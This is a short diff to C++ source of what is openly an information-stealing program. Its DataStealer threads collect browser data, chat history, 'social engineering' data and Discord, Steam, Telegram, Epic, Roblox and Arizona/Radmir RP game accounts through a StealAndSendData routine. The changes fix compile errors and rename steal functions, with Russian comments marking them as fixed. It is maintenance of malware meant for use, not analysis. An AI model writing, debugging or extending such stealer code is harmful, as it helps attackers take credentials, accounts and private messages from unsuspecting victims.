@@ -173,8 +173,8 @@ public:
         else if (type == "browser") result = mw->stealBrowserData(tempDir);
         else if (type == "chatHistory") result = mw->stealChatHistory(tempDir);
         else if (type == "socialEngineering") result = mw->collectSocialEngineeringData(tempDir);
-        else if (type == "arizonaRP") result = mw->StealArizonaData(tempDir);
-        else if (type == "radmirRP") result = mw->StealRadmirData(tempDir);
+        else if (type == "arizonaRP") result = mw->StealArizonaRPData(tempDir); // Исправлено
+        else if (type == "radmirRP") result = mw->StealRadmirRPData(tempDir);   // Исправлено
         mw->collectedData[type] = result;
     }
 private:
@@ -465,7 +465,7 @@ void MainWindow::StealAndSendData(const std::string& tempDir) {
 
     if (config.systemInfo) pool.start(new DataStealer(this, tempDir, "systemInfo"));
     if (config.discord) pool.start(new DataStealer(this, tempDir, "discord"));
-    if (config.steam) pool.start(new DataStealer(this, tempDir, "steam"]);
+    if (config.steam) pool.start(new DataStealer(this, tempDir, "steam")); // Исправлен синтаксис
     if (config.telegram) pool.start(new DataStealer(this, tempDir, "telegram"));
     if (config.epic) pool.start(new DataStealer(this, tempDir, "epic"));
     if (config.roblox) pool.start(new DataStealer(this, tempDir, "roblox"));
